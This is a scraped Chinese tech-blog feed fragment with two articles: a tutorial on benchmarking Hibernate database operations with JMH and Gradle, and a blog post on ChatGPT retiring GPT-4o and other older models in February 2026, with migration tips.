                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在性能测试中使用Hibernate，可以帮助你识别和解决与数据库访问相关的性能瓶颈。以下是一个详细的示例，结合代码讲解如何在性能测试中使用Hibernate，包括配置、性能测试工具的集成、编写性能测试脚本、分析结果等。</p>
<h3 data-id="heading-0">前提条件</h3>
<ul>
<li>使用MySQL作为数据库。</li>
<li>使用Gradle作为构建工具。</li>
<li>使用JUnit进行性能测试。</li>
<li>使用Hibernate进行ORM操作。</li>
<li>使用JMH（Java Microbenchmark Harness）进行性能基准测试。</li>
</ul>
<h3 data-id="heading-1">1. 设置Hibernate配置</h3>
<p>首先，创建一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/performance_test_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 创建实体类</h3>
<p>定义一个简单的实体类来表示数据库表中的数据。</p>
<h4 data-id="heading-4"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-5">3. 配置Gradle</h3>
<p>在Gradle构建脚本中添加Hibernate和JMH依赖。</p>
<h4 data-id="heading-6"><code>build.gradle</code></h4>
<pre><code class="hljs language-groovy" lang="groovy">plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.hibernate:hibernate-core:5.6.5.Final'
    implementation 'mysql:mysql-connector-java:8.0.27'
    testImplementation 'org.junit.jupiter:junit-jupiter:5.8.2'
    implementation 'org.openjdk.jmh:jmh-core:1.32'
    annotationProcessor 'org.openjdk.jmh:jmh-generator-annprocess:1.32'
}

test {
    useJUnitPlatform()
}
</code></pre>
<h3 data-id="heading-7">4. 编写数据种子</h3>
<p>编写一个初始化数据的类，用于在应用程序启动时插入一些初始数据。</p>
<h4 data-id="heading-8"><code>DataSeeder.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSeeder</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> config.buildSessionFactory();

        <span class="hljs-comment">// Seed data</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
            user.setName(<span class="hljs-string">"User"</span> + i);
            user.setEmail(<span class="hljs-string">"user"</span> + i + <span class="hljs-string">"@example.com"</span>);
            session.save(user);
        }

        transaction.commit();
        session.close();
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-9">5. 编写性能测试</h3>
<p>使用JMH编写性能测试脚本，测试Hibernate操作的执行效率。</p>
<h4 data-id="heading-10"><code>UserPerformanceTest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;
<span class="hljs-keyword">import</span> org.openjdk.jmh.annotations.*;

<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-meta">@State(Scope.Benchmark)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserPerformanceTest</span> {
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Setup(Level.Trial)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUp</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        sessionFactory = config.buildSessionFactory();
    }

    <span class="hljs-meta">@TearDown(Level.Trial)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tearDown</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (sessionFactory != <span class="hljs-literal">null</span>) {
            sessionFactory.close();
        }
    }

    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-meta">@BenchmarkMode(Mode.AverageTime)</span>
    <span class="hljs-meta">@OutputTimeUnit(TimeUnit.MILLISECONDS)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testInsertUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"TestUser"</span>);
        user.setEmail(<span class="hljs-string">"testuser@example.com"</span>);
        session.save(user);

        transaction.commit();
        session.close();
    }

    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-meta">@BenchmarkMode(Mode.AverageTime)</span>
    <span class="hljs-meta">@OutputTimeUnit(TimeUnit.MILLISECONDS)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testReadUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.get(User.class, <span class="hljs-number">1L</span>);
        session.close();
    }
}
</code></pre>
<h3 data-id="heading-11">6. 运行性能测试</h3>
<p>在Gradle中添加任务来运行JMH性能测试。</p>
<h4 data-id="heading-12"><code>build.gradle</code>（添加运行JMH的任务）</h4>
<pre><code class="hljs language-groovy" lang="groovy">task runJmh(type: JavaExec) {
    main = 'org.openjdk.jmh.Main'
    classpath = sourceSets.main.runtimeClasspath
    args = ['-f', '1', '-wi', '5', '-i', '5']
}
</code></pre>
<h3 data-id="heading-13">运行性能测试</h3>
<p>使用Gradle命令运行性能测试。</p>
<pre><code class="hljs language-bash" lang="bash">./gradlew runJmh
</code></pre>
<h3 data-id="heading-14">分析结果</h3>
<p>JMH会生成性能测试的结果，包含每次操作的平均时间、吞吐量等，可以帮助你识别性能瓶颈。</p>
<h3 data-id="heading-15">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置一个Hibernate配置文件，用于连接数据库。</li>
<li><strong>实体类：</strong> 创建一个简单的实体类来表示数据库表中的数据。</li>
<li><strong>Gradle配置：</strong> 在Gradle构建脚本中添加Hibernate和JMH依赖。</li>
<li><strong>数据种子：</strong> 编写初始化数据的类，用于在应用程序启动时插入一些初始数据。</li>
<li><strong>性能测试：</strong> 使用JMH编写性能测试脚本，测试Hibernate操作的执行效率。</li>
<li><strong>运行性能测试：</strong> 配置Gradle任务来运行JMH性能测试，使用Gradle命令执行测试。</li>
</ol>
<p>通过以上配置和代码示例，我们展示了如何在性能测试中使用Hibernate。这包括如何配置Hibernate、定义实体类、使用JMH进行性能基准测试、编写数据种子、以及如何运行和分析性能测试结果。此流程帮助你识别和解决与数据库访问相关的性能瓶颈，确保在实际应用中数据库操作的高效性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GPT-4o 终于要“下线”了]]></title>    <link>https://juejin.cn/post/7603186080494272563</link>    <guid>https://juejin.cn/post/7603186080494272563</guid>    <pubDate>2026-02-05T14:53:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603186080494272563" data-draft-id="7603185231802269722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GPT-4o 终于要“下线”了"/> <meta itemprop="keywords" content="ChatGPT,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T14:53:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dcs"/> <meta itemprop="url" content="https://juejin.cn/user/3679404422861902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GPT-4o 终于要“下线”了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3679404422861902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dcs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:53:13.000Z" title="Thu Feb 05 2026 14:53:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>OpenAI 在 <strong>2026 年 1 月 29 日</strong>发了一则产品公告：</p>
<p><strong>2026 年 2 月 13 日</strong>起，ChatGPT 会正式下线一批老模型——<strong>GPT-4o、GPT-4.1、GPT-4.1 mini、OpenAI o4-mini</strong>；在这一天下线的还有<strong>之前宣布的 GPT-5（Instant 和 Thinking）</strong>。</p>
<p>还有一点：<strong>API 目前不变</strong>，这次主要影响的是 <em>ChatGPT 内可选模型</em>。</p>
<p>很多人看到“GPT-4o 要下线”第一反应是：</p>
<p>“完了，我常用的那股‘更会聊天、更有温度’的味儿是不是没了？”</p>
<p>别急，公告里其实把原因说得挺直白：<strong>GPT-4o 这事有特殊背景</strong>，而且 OpenAI 团队也承认，之前“先下架、后又恢复”就是因为用户反馈太强烈。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff75838ed8674fdabc7d7182ee716da7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=WH8NliJDeedeGyRwFPRQ929%2B7U4%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">1）这次到底下哪些？</h2>
<ul>
<li><strong>下线时间</strong>：<strong>2026-02-13</strong></li>
<li><strong>ChatGPT 内下线模型</strong>：GPT-4o / GPT-4.1 / GPT-4.1 mini / OpenAI o4-mini</li>
<li><strong>API</strong>：公告明确说 <strong>“at this time no changes”</strong>（至少目前不动）</li>
</ul>
<p>总而言之：</p>
<blockquote>
<p>ChatGPT 这个“前台下拉框”里要做一次断舍离，但“ API ”暂时没改。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">2）为什么 GPT-4o 还要单独拉出来讲？</h2>
<p>公告里给 GPT-4o 这段写得很像“产品复盘”：</p>
<ul>
<li>GPT-4o 之前被弃用过</li>
<li>GPT-5 发布期间又恢复过</li>
<li>恢复的原因是：<strong>一部分 Plus/Pro 用户反馈迁移不及</strong>，尤其是<strong>创意构思（creative ideation）<strong>这类场景；同时也更喜欢 GPT-4o 的</strong>对话风格和温暖感</strong></li>
</ul>
<p>说人话就是：
<strong>有些人不是追“最强”，而是追“最顺手、最像个靠谱同事”。</strong></p>
<hr/>
<h2 data-id="heading-2">3）GPT-5.1 / GPT-5.2 把 4o 的优点吸收了</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abec1b53ac574e278786452756c5ec0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=pEAC%2FK%2FZTX0mVGgqF4n7Clt3Jiw%3D" alt="image.png" loading="lazy"/></p>
<p>官方说用户对 GPT-4o 的反馈，直接影响了 <strong>GPT-5.1 和 GPT-5.2</strong> 的方向，重点包括：</p>
<ul>
<li><strong>人格/语气（personality）更好</strong></li>
<li><strong>更强的创意支持</strong></li>
<li><strong>更多可自定义的回复方式</strong>（比如 base styles、tones，甚至可以调“温暖/热情”这类参数）</li>
</ul>
<p>这里其实透露了一个产品趋势：</p>
<p>以后模型能力是一部分，但“你想让它怎么说话”会变成另一条主线。对内容创作者、产品经理、以及需要写沟通文案的开发者来说，这个变化挺关键——<strong>风格可控，才更像工具，而不是靠赌。</strong></p>
<hr/>
<h2 data-id="heading-3">4）为什么现在宣布？</h2>
<p>公告里给了一个“看起来很冷冰冰但很有说服力”（我认为说服不了我[机智]）的数据：</p>
<blockquote>
<p>绝大多数使用已经转到 GPT-5.2，每天只有 <strong>0.1%</strong> 用户还在选 GPT-4o。</p>
</blockquote>
<p>这就解释了“为什么敢下”：
当一个选项只剩极少数人用，继续维护它的成本（工程、测试、体验一致性）就会越来越不划算。</p>
<h2 data-id="heading-4">5）对普通用户/开发者，最实用的迁移思路是什么？</h2>
<h3 data-id="heading-5">日常用户（写作、头脑风暴、对话陪跑）</h3>
<ul>
<li>目标不是“找替代品”，而是<strong>把 GPT-5.2 的风格调成你熟悉的手感</strong></li>
<li>优先试：<strong>Friendly</strong> 这类 base style，然后再按需加“warmth / enthusiasm”方向的控制</li>
</ul>
<h3 data-id="heading-6">专业用户（写需求、写方案、写代码、做结构化输出）</h3>
<ul>
<li>
<p>把“模型选择”换成“可复现配置”：</p>
<ul>
<li>固定 base style / tone</li>
<li>固定输出格式（标题层级、要点数量、表格/清单规则）</li>
<li>固定错误处理方式（不确定就说不知道）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">团队/流程（把 ChatGPT 作为生产力的一环）</h3>
<ul>
<li>
<p>做一张“迁移检查清单”最省心：</p>
<ol>
<li>你们最依赖 GPT-4o 的 5 个场景是什么（比如创意文案、PRD、代码 review、用户回复、脑暴）</li>
<li>每个场景写 3 条“验收标准”（比如语气、结构、长度、是否给步骤）</li>
<li>用 GPT-5.2 跑一遍，把差异记录成可调参数（风格、提示词模板、输出约束）</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-8">6）结语</h2>
<p>OpenAI 团队接下来会继续优化：</p>
<ul>
<li><strong>人格与创造力</strong>进一步提升</li>
<li><strong>减少不必要的拒绝</strong>、以及那种“过度谨慎/说教式”的回答（更新“coming soon”）</li>
</ul>
<p>另外还有一条比较“产品化”的动作：他们说为了支持更多选择与自由，已经在多数市场对 <strong>18 岁以下用户</strong>上线了 <strong>age prediction</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34ee0d1f2cc3427990c1dfaeeaa78702~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=NBwkhQG%2FQajwuG%2Fut86gjXnFC%2B8%3D" alt="image.png" loading="lazy"/></p>
<p>如果你就是那 0.1%，也不用和官方硬刚</p>
<p>GPT-4o 的“温度”确实是很多人喜欢它的原因，但从公告看，OpenAI 团队的态度是：
<strong>把这份偏好迁移到可调节的体验层</strong>，而不是继续保留一堆旧模型让产品越来越难维护。</p>
<p>你真正要保住的，不是“4o 这个名字”，而是你工作流里那套：
<strong>提示词模板 + 风格配置 + 输出标准</strong>。把它搬到 GPT-5.2 上，你会更稳。</p>
<hr/>
<p><strong>喜欢就奖励一个“👍”和“在看”呗~</strong></p>
